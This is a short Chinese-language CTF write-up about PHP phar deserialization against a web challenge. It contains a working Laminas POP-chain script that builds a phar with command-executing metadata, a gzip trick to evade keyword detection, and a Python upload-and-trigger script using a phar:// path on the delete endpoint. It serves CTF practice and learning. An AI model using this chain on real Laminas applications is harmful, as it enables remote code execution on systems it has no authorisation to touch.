tags:: [[CTFWEB/PHP/Phar]]

- # 思路
	- phar反序列化，上传文件处上传phar，然后unlink触发
- # phar反序列化
	- 抄的大佬的Laminas RCE POP链，之后可以搜`xxx popchain`找相关框架的popchain
		- 话说phpggc真的是干啥啥不行，laminas的链只有删除的能用
		- https://xz.aliyun.com/t/8975#toc-10
		- ```php
		  <?php 
		  
		  namespace Laminas\View\Resolver{
		  	class TemplateMapResolver{
		  		protected $map = ["setBody"=>"system"];
		  	}
		  }
		  namespace Laminas\View\Renderer{
		  	class PhpRenderer{
		  		private $__helpers;
		  		function __construct(){
		  			$this->__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
		  		}
		  	}
		  }
		  
		  
		  namespace Laminas\Log\Writer{
		  	abstract class AbstractWriter{}
		  	
		  	class Mail extends AbstractWriter{
		  		protected $eventsToMail = ["sleep 10"];	//  cmd  cmd cmd
		  		protected $subjectPrependText = null;
		  		protected $mail;
		  		function __construct(){
		  			$this->mail = new \Laminas\View\Renderer\PhpRenderer();
		  		}
		  	}
		  }
		  
		  namespace Laminas\Log{
		  	class Logger{
		  		protected $writers;
		  		function __construct(){
		  			$this->writers = [new \Laminas\Log\Writer\Mail()];
		  		}
		  	}
		  }
		  
		  namespace{
		  $a = new \Laminas\Log\Logger();
		  $phar = new Phar("phar.phar"); //后缀名必须为 phar
		  $phar->startBuffering();
		  $phar->setStub("XXX<?php XXX __HALT_COMPILER(); ?>"); 
		  $phar->setMetadata($a); //将自定义的 meta-data 存入 manifest
		  $phar->addFromString("a", str_repeat('123',1000000)); //添加要压缩的文件
		  //签名自动计算
		  $phar->stopBuffering();}
		  ?>
		  
		  ```
	- 然后用`gzip phar.phar`压缩一下，绕过关键词检测
	- 最后触发
		- ```python
		  r = base_post(url + "/album/imgupload", files = {
		      "image-file": ("p.jpg", content)
		  })
		  path = r.text.partition("<!DOCTYPE html>")[0]
		  print(path)
		  r = base_post(url + "/album/imgdelete", data = {
		      "imgpath": f"phar://{path}/b.jpg"
		  })
		  print(r.text)
		  
		  ```